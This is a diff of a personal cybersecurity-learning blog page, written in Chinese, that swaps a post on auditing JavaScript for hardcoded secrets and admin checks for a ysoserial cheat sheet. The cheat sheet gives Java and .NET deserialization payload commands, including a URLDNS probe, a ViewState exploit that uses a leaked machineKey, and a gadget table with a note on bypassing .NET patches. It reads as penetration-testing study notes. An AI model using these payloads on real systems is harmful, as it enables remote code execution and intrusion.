@@ -5,65 +5,34 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>JS | Cybersecurity learning</title>
+<title>Yso | Cybersecurity learning</title>
 <meta name="keywords" content="">
-<meta name="description" content="本人代码能力不是很好，对很多网站框架和文件理解不是很深，所以看js文件的时候难免有些困难，所以有了这篇文章
-JS审计技巧
-遇到source.map(.map)可以直接还原源码
-首先是一些用来搜索的正则：
+<meta name="description" content="JAVA_YSO
+基础命令格式
+java -jar ysoserial.jar [利用链] [执行的命令]
 
-api/| /v[0-9]|/admin|/internal|/private
-key:|secret:|token:|password:|apikey|sk_ |pk_ |AKIA（AWS）
-fetch|axios|XMLHttpRequest|$.post|$.ajax
-localStorage|sessionStorage|cookie
-if\s*\(\s*user\.role|isAdmin|level|permission
-innerHTML|eval|document\.write（XSS sink）
+利用链: CommonsCollections1, URLDNS, Jackson 等
+探测/检测
+如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS
+java -jar ysoserial.jar URLDNS &#34;http://your-dnslog-url.com&#34;
+注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c
+.net_yso
+基础命令
+ysoserial.exe -g [Gadget] -f [Formatter] -c &#34;[Command]&#34; -o 编码
 
-看完上面这些，还要看什么？
-
-
-密钥
-如: const KEY = &quot;xxx&quot;、process.env.VITE_xxx（Vite 常见泄露）、client_secret。
-
-
-如config.chunk.js 里：
-const stripeConfig = {
-  publishableKey: &#34;pk_live_51Hb...xxxx&#34;,   // Stripe 真实密钥
-  clientSecret: &#34;sk_test_51Hb...xxxx&#34;
-};
-var fallbackSecret = &#34;supersecret2025!@#&#34;;  // 备用密钥
-
-API
-
-可以用上面的正则去搜
-
-逻辑/授权检查
-
-如:  if (user.isAdmin)、if (role === &#39;vip&#39;)、if (canEdit)。
-if (user.vipLevel &gt;= 3) {
-  showDownloadButton();   // 前端判断
-} else {
-  hideIt();
-}
-
-加密/签名
-
-如CryptoJS、encrypt、sign、md5、rsa 函数。
-password: CryptoJS.AES.encrypt(pwd, &#39;hardcoded_key_123&#39;).toString()
-逆向出密钥，就能批量撞库或伪造登录
-不用看的JS
-
-
-第三方库完整代码jquery-3.6.0.min.js、lodash.min.js、react.production.min.js 全文件。 → 只看最上面注释的版本号（查 CVE），其余不看。
-
-
-一些框架的打包，如React/Vue/Next.js 的
-_createElementVNode, useState, render() { ... }
-
-
-还有一些轮番图片等">
+-g  利用链的名称,如TextFormattingRunProperties
+-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
+-c  执行的命令
+-o  编码处理,如 raw ,bash64, urlencode
+利用  (web Machinekey泄露)
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34; --validationkey=&#34;你的KEY&#34; --validationalg=&#34;SHA1&#34;
+技巧
+- p 参数可以指定插件,对一些特定目标进行测试
+-p ViewState：处理 ASP.NET ViewState。
+-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
+利用链:">
 <meta name="author" content="h4xk0r">
-<link rel="canonical" href="http://localhost:1313/posts/js%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/">
+<link rel="canonical" href="http://localhost:1313/posts/yso/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
@@ -72,7 +41,7 @@ _createElementVNode, useState, render() { ... }
 <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/js%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/yso/">
 <noscript>
     <style>
         #theme-toggle,
@@ -147,9 +116,9 @@ _createElementVNode, useState, render() { ... }
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      JS
+      Yso
     </h1>
-    <div class="post-meta"><span title='2026-02-28 22:41:23 +0800 CST'>February 28, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span>
+    <div class="post-meta"><span title='2026-04-10 23:50:39 +0800 CST'>April 10, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span>
 
 </div>
   </header> <div class="toc">
@@ -160,100 +129,55 @@ _createElementVNode, useState, render() { ... }
 
         <div class="inner"><ul>
                 <li>
-                    <a href="#js%e5%ae%a1%e8%ae%a1%e6%8a%80%e5%b7%a7" aria-label="JS审计技巧">JS审计技巧</a><ul>
+                    <a href="#java_yso" aria-label="JAVA_YSO">JAVA_YSO</a><ul>
+                        <ul>
+                        <ul>
                         
                 <li>
-                    <a href="#%e7%9c%8b%e5%ae%8c%e4%b8%8a%e9%9d%a2%e8%bf%99%e4%ba%9b%e8%bf%98%e8%a6%81%e7%9c%8b%e4%bb%80%e4%b9%88" aria-label="看完上面这些，还要看什么？">看完上面这些，还要看什么？</a></li>
+                    <a href="#%e5%9f%ba%e7%a1%80%e5%91%bd%e4%bb%a4%e6%a0%bc%e5%bc%8f" aria-label="基础命令格式">基础命令格式</a></li>
                 <li>
-                    <a href="#%e4%b8%8d%e7%94%a8%e7%9c%8b%e7%9a%84js" aria-label="不用看的JS">不用看的JS</a></li></ul>
+                    <a href="#%e6%8e%a2%e6%b5%8b%e6%a3%80%e6%b5%8b" aria-label="探测/检测">探测/检测</a></li></ul>
+                    </ul>
+                    </ul>
                 </li>
                 <li>
-                    <a href="#%e6%ad%a5%e9%aa%a4" aria-label="步骤：">步骤：</a>
+                    <a href="#net_yso" aria-label=".net_yso">.net_yso</a>
                 </li>
             </ul>
         </div>
     </details>
 </div>
 
-  <div class="post-content"><p>本人代码能力不是很好，对很多网站框架和文件理解不是很深，所以看js文件的时候难免有些困难，所以有了这篇文章</p>
-<h3 id="js审计技巧">JS审计技巧<a hidden class="anchor" aria-hidden="true" href="#js审计技巧">#</a></h3>
-<p>遇到source.map(.map)可以直接还原源码</p>
-<p>首先是一些用来搜索的正则：</p>
-<ul>
-<li><code>api/| /v[0-9]|/admin|/internal|/private</code></li>
-<li><code>key:|secret:|token:|password:|apikey|sk_ |pk_ |AKIA</code>（AWS）</li>
-<li><code>fetch|axios|XMLHttpRequest|$.post|$.ajax</code></li>
-<li><code>localStorage|sessionStorage|cookie</code></li>
-<li><code>if\s*\(\s*user\.role|isAdmin|level|permission</code></li>
-<li><code>innerHTML|eval|document\.write</code>（XSS sink）</li>
-</ul>
-<h4 id="看完上面这些还要看什么">看完上面这些，还要看什么？<a hidden class="anchor" aria-hidden="true" href="#看完上面这些还要看什么">#</a></h4>
-<ol>
-<li>
-<p><strong>密钥</strong></p>
-<p>如: <code>const KEY = &quot;xxx&quot;</code>、<code>process.env.VITE_xxx</code>（Vite 常见泄露）、<code>client_secret</code>。</p>
-</li>
-</ol>
-<p>如config.chunk.js 里：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stripeConfig</span> <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">publishableKey</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;pk_live_51Hb...xxxx&#34;</span>,   <span style="color:#75715e">// Stripe 真实密钥
-</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">clientSecret</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;sk_test_51Hb...xxxx&#34;</span>
-</span></span><span style="display:flex;"><span>};
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fallbackSecret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;supersecret2025!@#&#34;</span>;  <span style="color:#75715e">// 备用密钥
-</span></span></span></code></pre></div><ol start="2">
-<li><strong>API</strong></li>
-</ol>
-<p>可以用上面的正则去搜</p>
-<ol start="3">
-<li><strong>逻辑/授权检查</strong></li>
-</ol>
-<p>如:  <code>if (user.isAdmin)</code>、<code>if (role === 'vip')</code>、<code>if (canEdit)</code>。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">vipLevel</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>) {
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">showDownloadButton</span>();   <span style="color:#75715e">// 前端判断
-</span></span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">hideIt</span>();
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><ol start="4">
-<li><strong>加密/签名</strong></li>
-</ol>
-<p>如<code>CryptoJS</code>、<code>encrypt</code>、<code>sign</code>、<code>md5</code>、<code>rsa</code> 函数。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">AES</span>.<span style="color:#a6e22e">encrypt</span>(<span style="color:#a6e22e">pwd</span>, <span style="color:#e6db74">&#39;hardcoded_key_123&#39;</span>).<span style="color:#a6e22e">toString</span>()
-</span></span></code></pre></div><p>逆向出密钥，就能批量撞库或伪造登录</p>
-<h4 id="不用看的js">不用看的JS<a hidden class="anchor" aria-hidden="true" href="#不用看的js">#</a></h4>
-<ol>
-<li>
-<p>第三方库完整代码jquery-3.6.0.min.js、lodash.min.js、react.production.min.js 全文件。 → 只看最上面注释的版本号（查 CVE），其余不看。</p>
-</li>
-<li>
-<p>一些框架的打包，如React/Vue/Next.js 的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">_createElementVNode</span>, <span style="color:#a6e22e">useState</span>, <span style="color:#a6e22e">render</span>() { ... }
-</span></span></code></pre></div></li>
-<li>
-<p>还有一些轮番图片等</p>
-</li>
-</ol>
-<h3 id="步骤">步骤：<a hidden class="anchor" aria-hidden="true" href="#步骤">#</a></h3>
-<ol>
-<li>
-<p>正则匹配的看完</p>
-</li>
-<li>
-<p>Network看加载</p>
-<pre tabindex="0"><code>F12 → Network → 过滤 js
-刷新页面 / 登录 / 点击关键功能（支付、查看用户列表）
-看哪个 JS 在你操作后才加载 → 那就是核心业务文件
-
-不看的：页面一打开就加载的 vendor.*.js（第三方库，如 React、lodash）
-</code></pre></li>
-<li>
-<p>可以把JS全部下载下来然后搜索：</p>
-<pre tabindex="0"><code>一个简单的搜索
-grep -l -E &#34;fetch|axios|api/|token|secret|isAdmin&#34; *.js
-</code></pre><p>按大小排序看大的文件，就有可能是业务逻辑</p>
-</li>
-</ol>
-<p>注： 先检查有没有source.map ,如果有可以直接还原</p>
-
+  <div class="post-content"><h2 id="java_yso">JAVA_YSO<a hidden class="anchor" aria-hidden="true" href="#java_yso">#</a></h2>
+<h5 id="基础命令格式">基础命令格式<a hidden class="anchor" aria-hidden="true" href="#基础命令格式">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar ysoserial.jar <span style="color:#f92672">[</span>利用链<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>执行的命令<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>利用链: CommonsCollections1, URLDNS, Jackson 等
+</span></span></code></pre></div><h5 id="探测检测">探测/检测<a hidden class="anchor" aria-hidden="true" href="#探测检测">#</a></h5>
+<p>如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用<code>URLDNS</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar ysoserial.jar URLDNS <span style="color:#e6db74">&#34;http://your-dnslog-url.com&#34;</span>
+</span></span></code></pre></div><p>注: 如果执行复杂命令最好封装成脚本执行,或者使用<code>sh -c</code>/<code>bash -c</code></p>
+<h2 id="net_yso">.net_yso<a hidden class="anchor" aria-hidden="true" href="#net_yso">#</a></h2>
+<p>基础命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ysoserial.exe -g <span style="color:#f92672">[</span>Gadget<span style="color:#f92672">]</span> -f <span style="color:#f92672">[</span>Formatter<span style="color:#f92672">]</span> -c <span style="color:#e6db74">&#34;[Command]&#34;</span> -o 编码
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-g  利用链的名称,如TextFormattingRunProperties
+</span></span><span style="display:flex;"><span>-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
+</span></span><span style="display:flex;"><span>-c  执行的命令
+</span></span><span style="display:flex;"><span>-o  编码处理,如 raw ,bash64, urlencode
+</span></span></code></pre></div><p>利用  (web Machinekey泄露)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span style="color:#e6db74">&#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34;</span> --validationkey<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;你的KEY&#34;</span> --validationalg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SHA1&#34;</span>
+</span></span></code></pre></div><p>技巧</p>
+<p><code>- p</code> 参数可以指定插件,对一些特定目标进行测试</p>
+<pre tabindex="0"><code>-p ViewState：处理 ASP.NET ViewState。
+-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
+</code></pre><p>利用链:</p>
+<pre tabindex="0"><code>场景/格式,            				推荐 Gadget,										说明
+BinaryFormatter				TextFormattingRunProperties					通用性最强，成功率高
+Json.NET					  ObjectDataProvider					   针对特定配置的 JSON 解析
+XamlReader,					    ExpandedWrapper					   	   常用于 WPF 或特定 XML 处理
+通用（高版本）				   ActivitySurrogateSelector				  配合插件可执行任意 C# 代码
+</code></pre>
 
   </div>
 
